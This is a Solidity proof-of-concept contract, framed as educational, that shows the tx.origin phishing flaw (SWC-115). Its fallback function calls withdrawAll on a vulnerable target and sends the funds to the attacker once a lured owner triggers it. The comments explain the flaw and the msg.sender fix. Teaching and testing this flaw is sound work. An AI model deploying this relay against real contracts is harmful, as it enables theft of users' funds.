/*
 * Educational proof-of-concept for the tx.origin flaw (SWC-115).
 *
 * The vulnerable Phishable.withdrawAll() checks `tx.origin == owner`.
 * tx.origin is the ORIGINAL externally-owned account that started the
 * transaction, not the immediate caller. So if the owner can be lured into
 * calling any function on this relay contract, the relay can turn around and
 * call withdrawAll() — and tx.origin is still the owner, so the check passes.
 *
 * This is the standard illustration from the Consensys best-practices docs of
 * why tx.origin must never be used for authorisation. It only works against
 * the VULNERABLE contract; the fixed version (msg.sender) makes this relay
 * fail, which is exactly what the test asserts.
 */
pragma solidity ^0.4.22;

interface IPhishable {
    function withdrawAll(address _recipient) external;
}

contract AttackPhishable {
    IPhishable public target;
    address public attacker;

    constructor(address _target) public {
        target = IPhishable(_target);
        attacker = msg.sender;
    }

    // The owner is socially engineered into calling this (it looks harmless).
    // Because the owner started the tx, tx.origin == owner inside withdrawAll.
    function () public payable {
        target.withdrawAll(attacker);
    }
}
